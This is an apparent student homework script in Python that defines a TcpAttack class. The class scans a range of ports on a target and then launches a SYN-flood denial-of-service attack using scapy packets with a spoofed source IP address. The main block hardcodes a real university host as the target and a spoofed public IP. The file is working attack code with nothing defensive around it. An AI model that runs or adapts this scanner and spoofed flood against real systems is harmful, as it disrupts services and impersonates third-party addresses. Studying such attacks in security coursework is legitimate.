#Homework Number: hw09
#Name: Tycho Halpern
#ECN login: thalper
#Due Date: March 28, 2022
#!/usr/bin/env python3

import socket
from scapy.all import *

class TcpAttack:
    def __init__(self,spoofIP,targetIP):
        """
        spoofIP (str): IP address to spoof
        targetIP (str): IP address of the target computer to be attacked
        """
        self.spoofIP = spoofIP # spoof IP
        self.targetIP = targetIP # target IP


    def scanTarget(self,rangeStart,rangeEnd):
        """
        rangeStart (int): The first port in the range of ports being scanned.
        rangeEnd (int): The last port in the range of ports being scanned
        No return value, but writes open ports to openports.txt
        """
        with open('openports.txt', 'w') as output_file:
            for port in range(rangeStart, rangeEnd+1):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create socket
                sock.settimeout(0.1)
                test_result = sock.connect_ex((self.targetIP, port)) # attempt to connect to port number i
                if test_result == 0:
                    output_file.write(str(port) + '\n') # no error when connecting to port
                sock.close()



    
    def attackTarget(self,port,numSyn):
        """
        port (int): The port that the attack will use
        numSyn (int): Number of SYN packets to send to target IP address and port.
        If the port is open, perform DoS attack and return 1. Otherwise return 0.
        """
        retval = 0
        sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM ) # create socket
        sock.settimeout(0.1)
        try:
            sock.connect( (self.targetIP, port) ) # attempt to connnect to the port
        except:
            return 0
            
        # From DoS5.py
        for i in range(numSyn):
            IP_header = IP(src = self.spoofIP, dst = self.targetIP)
            TCP_header = TCP(flags = "S", sport = RandShort(), dport = port)
            packet = IP_header / TCP_header
            try:
                send(packet)
                retval += 1
            except Exception as e:
                print(e)

        return retval
       
if __name__ == "__main__":
    spoofIP="69.174.157.240" # spoof IP
    targetIP="ecegrid.ecn.purdue.edu" # target IP
    Tcp = TcpAttack(spoofIP,targetIP)
    rangeStart=10 # start of range of ports to scan
    rangeEnd=25 # end of range of ports to scan
    port=22 # port to attack
    Tcp.scanTarget(rangeStart, rangeEnd) # scan range of ports
    count = Tcp.attackTarget(port,10) # attack port with x packets
    if count > 0: # packets succesfully sent to port
        print("port was open to attack", port, count)
    else:
        print("port closed", port)